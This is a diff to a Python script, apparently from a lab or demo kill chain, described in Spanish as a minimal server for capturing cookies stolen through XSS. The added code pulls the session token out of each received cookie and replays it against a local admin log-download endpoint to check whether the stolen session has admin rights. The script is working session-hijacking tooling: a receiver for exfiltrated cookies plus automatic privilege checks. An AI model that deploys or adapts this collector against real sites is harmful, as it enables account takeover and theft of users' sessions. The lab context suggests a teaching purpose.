@@ -2,7 +2,18 @@
 """Servidor minimo para capturar cookies robadas por XSS (Paso 1 del kill chain)."""
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
+
+import requests
+
+
+def session_token(cookie_value: str) -> str:
+    cookies = SimpleCookie()
+    cookies.load(cookie_value)
+    if "session" in cookies:
+        return cookies["session"].value
+    return cookie_value
 
 
 class CookieLogHandler(BaseHTTPRequestHandler):
@@ -17,6 +28,21 @@ class CookieLogHandler(BaseHTTPRequestHandler):
         print("\n--- Cookie recibida ---")
         print(cookie)
         print("-----------------------\n")
+        token = session_token(cookie)
+        try:
+            response = requests.get(
+                "http://127.0.0.1:8000/admin/logs/download",
+                params={"file": "var/www/app/logs/activity.log"},
+                cookies={"session": token},
+                timeout=5,
+            )
+            print(response)
+            if response.status_code == 200:
+                print("Cookie Admin")
+            else:
+                print("Cookie Usuario")
+        except requests.RequestException as exc:
+            print(f"No se pudo validar la cookie: {exc}")
         self.send_response(204)
         self.end_headers()
 
@@ -26,10 +52,9 @@ class CookieLogHandler(BaseHTTPRequestHandler):
 
 def main() -> None:
     host = "127.0.0.1"
-    port = 9000
+    port = 9010
     server = HTTPServer((host, port), CookieLogHandler)
     print(f"Escuchando en http://{host}:{port}/log?cookie=...")
-    print("Dejar esta terminal abierta durante la demo de XSS.")
     server.serve_forever()
 
 
